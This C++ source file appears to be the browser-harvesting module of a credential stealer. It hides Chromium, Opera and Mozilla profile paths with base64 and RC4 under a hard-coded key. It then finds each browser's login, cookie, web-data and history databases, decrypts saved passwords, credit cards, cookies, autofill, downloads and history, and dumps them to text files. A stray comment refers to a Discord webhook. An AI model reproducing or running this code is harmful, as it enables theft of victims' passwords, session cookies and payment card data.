#include <filesystem>
#include "Chromium.h"
#include "Paths.h"
#include "DecryptChromium.h"
#include "Common.h"
#include "BrowserUtils.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <codecvt>
#include <regex>
#include <vector>
#include <filesystem>
#include <Shlwapi.h>
#include "base64.h"
#include "rc4.h"
#include <string>
#include <Windows.h>

namespace fs = std::experimental::filesystem;

#define  _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem;

#pragma comment(lib, "Shlwapi.lib")

std::string CombinePaths(const std::string& base, const std::string& relative) {
	if (base.empty()) return relative;
	if (base.back() == '\\' || base.back() == '/') return base + relative;
	return base + "\\" + relative;
}

// Function to replace all occurrences of a substring with a new substring
std::string Chromium::Replace(std::string str, std::string substr, std::string newsubstr)
{
	size_t pos = 0; // Start position for searching
	// Loop until no more occurrences of 'substr' are found
	while ((pos = str.find(substr, pos)) != std::string::npos) {
		// Replace 'substr' at position 'pos' with 'newsubstr'
		str.replace(pos, substr.length(), newsubstr);
		// Advance position by the length of the replacement string to avoid infinite loop
		pos += newsubstr.length();
	}
	return str; // Return the modified string
}

// Function to find and extract a substring between the first two occurrences of '\'
std::string Chromium::FindSubstring(std::string str)
{
	// Find the first occurrence of '\'
	size_t pos1 = str.find("\\");
	if (pos1 != std::string::npos) { // Check if '\' was found
		// Find the second occurrence of '\' after the first
		size_t pos2 = str.find("\\", pos1 + 1);
		if (pos2 != std::string::npos) { // Check if the second '\' was found
			// Extract the substring between the two '\' characters
			return str.substr(pos1 + 1, pos2 - pos1 - 1);
		}
	}
	return ""; // Return an empty string if no valid substring is found
}

// Function to deduce an application name based on a given path
std::string Chromium::BrowserPathToAppName(std::string sLoginData)
{
	// Check if "Opera" exists in the input string
	if (sLoginData.find("Opera") != std::string::npos) {
		return "Opera"; // Return "Opera" if it matches
	}

	// Replace a specific path substring (Paths::Lappdata) with an empty string
	std::string replace = Replace(sLoginData, Paths::Lappdata, "");

	// Extract a substring using the FindSubstring function
	std::string substring = FindSubstring(replace);

	return substring; // Return the extracted substring
}

// Function to check if a given filesystem path exists
bool Chromium::PathExists(const std::string& path) {
	struct stat info; // Struct to store filesystem info
	// Use stat to check if the path exists and is accessible
	return (stat(path.c_str(), &info) == 0);
}

// Function to find specific files in a directory and its subdirectories
std::vector<std::string> find_files(const std::string& path, const std::vector<std::string>& filenames)
{
	std::vector<std::string> results(filenames.size()); // Initialize result vector with placeholders
	// Check if the given path exists and is a directory
	if (!fs::exists(path) || !fs::is_directory(path)) {
		return results; // Return empty results if the path is invalid
	}

	std::vector<std::string> subdirs; // Vector to store subdirectory paths
	// Iterate over the contents of the directory
	for (auto& entry : fs::directory_iterator(path)) {
		auto subpath = entry.path().string(); // Get the full path of the entry
		// Check if the entry is a directory
		if (fs::is_directory(entry.status())) {
			subdirs.push_back(subpath); // Add to subdirectory list
		}
		// Check if the entry is a regular file
		else if (fs::is_regular_file(entry.status())) {
			auto filename_ = entry.path().filename().string(); // Get the file name
			// Compare the file name with the target file names
			for (size_t i = 0; i < filenames.size(); ++i) {
				if (filename_ == filenames[i]) {
					results[i] = subpath; // Save the full path if it matches
				}
			}
		}
	}

	// Recursively search subdirectories
	for (auto& subdir : subdirs) {
		auto subresults = find_files(subdir, filenames); // Recursive call
		// Merge results from subdirectories
		for (size_t i = 0; i < filenames.size(); ++i) {
			if (!subresults[i].empty()) {
				results[i] = subresults[i];
			}
		}
	}

	return results; // Return the collected results
}

// Function to create a directory, first removing it if it already exists
bool createdir(std::string path)
{
	// Retrieve the attributes of the specified path (whether it's a directory, file, etc.)
	DWORD attr = GetFileAttributes(path.c_str());

	// Check if the path is valid and is a directory
	if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {

		// If it is a directory, try to remove it
		if (!RemoveDirectory(path.c_str())) {
			std::cerr << "Failed to remove directory." << std::endl; // Print error if removal fails
			return 1; // Return failure if directory removal fails
		}
	}

	// Create the directory (if it doesn't exist already)
	if (!CreateDirectory(path.c_str(), NULL)) {
		std::cerr << "Failed to create directory." << std::endl; // Print error if creation fails
		return 1; // Return failure if directory creation fails
	}

	// Return success if everything goes well
}

// Main function that handles browser data extraction and storage
void Chromium::Run(std::string sSavePath)
{
	// Check if the provided save path exists, otherwise create it
	if (GetFileAttributesA(sSavePath.c_str()) == INVALID_FILE_ATTRIBUTES) {

		// Try to create the directory for saving data
		if (!CreateDirectoryA(sSavePath.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
			std::cerr << "Error creating folder: " << GetLastError() << std::endl;
			return; // Exit if folder creation fails
		}
	}

	// Iterate over a list of Chromium password paths
	for (auto& spath : Paths::SChromiumPswPaths)
	{
		// Decrypt Discord webhook, username, and avatar
		std::string ChromiumPswPaths = base64_decode(spath);
		const unsigned char* ChromiumPswPaths_str_To_char = reinterpret_cast<const unsigned char*>(ChromiumPswPaths.c_str());
		char* decStr_char = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)ChromiumPswPaths_str_To_char, ChromiumPswPaths.length());
		std::string decStr(reinterpret_cast<char*>(decStr_char));

		// Declare a string to hold the full path for storing data
		std::string sFullPath;

		// Check if the decrypted string contains "Opera Software" (indicating Opera browser data)
		if (decStr.find("Opera Software") != std::string::npos || decStr.find("Mozilla") != std::string::npos)
		{
			// Use the Opera-specific path
			sFullPath = CombinePaths(Paths::Appdata, decStr);
		}
		else
		{
			// Use a generic path for other browsers
			sFullPath = CombinePaths(Paths::Lappdata, decStr);
		}

		// Check if the full path exists
		if (PathExists(sFullPath)) {

			// Define a list of filenames to look for in the path
			std::vector<std::string> filenames = { "Web Data", "Login Data", "Cookies","History" };

			// Find the specified files in the given path
			auto results = find_files(sFullPath, filenames);


			// Copy each of the found files to temporary locations
			std::string WebDataPath = results[0];
			std::string LoginDataPath = results[1];
			std::string CookiesPath = results[2];
			std::string HistoryPath = results[3];

			// Create a directory to save extracted data, based on the browser's name
			std::string sBDir = sSavePath + "\\" + BrowserPathToAppName(decStr);

			// Try to create the directory and return if creation fails
			if (!createdir(sBDir))
			{
				return;
			}

			//// Decrypt the extracted data from the temporary files
			std::vector<CreditCard> pCreditCards = DecryptChromium::DecryptCreditCard(WebDataPath);
			std::vector<Password> pPasswords = DecryptChromium::DecryptPassword(LoginDataPath);
			std::vector<Cookie> pCookies = DecryptChromium::DecryptCookie(CookiesPath);
			std::vector<Site> pHistory = DecryptChromium::DecryptHistory(HistoryPath);
			std::vector<Download> pDownloads = DecryptChromium::DecryptDownloads(HistoryPath);
			std::vector<AutoFill> pAutoFill = DecryptChromium::DecryptAutoFill(WebDataPath);

			//// Define paths for storing the decrypted data
			std::string passwordsFilePath = sBDir + "\\Passwords_Info.txt";
			std::string CreditCardsPath = sBDir + "\\CreditCards.txt";
			std::string cookiesFilePath = sBDir + "\\Cookies_Info.txt";
			std::string historyFilePath = sBDir + "\\History_Info.txt";
			std::string downloadsFilePath = sBDir + "\\Downloads_Info.txt";
			std::string autoFillFilePath = sBDir + "\\AutoFill_Info.txt";

			//// Write the decrypted data to respective files
			BrowserUtils::WritePasswords(pPasswords, passwordsFilePath);
			BrowserUtils::WriteCreditCards(pCreditCards, CreditCardsPath);
			BrowserUtils::WriteCookies(pCookies, cookiesFilePath);
			BrowserUtils::WriteHistory(pHistory, historyFilePath);
			BrowserUtils::WriteDownload(pDownloads, downloadsFilePath);
			BrowserUtils::WriteAutoFill(pAutoFill, autoFillFilePath);
		}
		else {
			std::cout << "Chromium::Run The path does not exist." << std::endl; // Print error if the path doesn't exist
		}

	
	 }

}
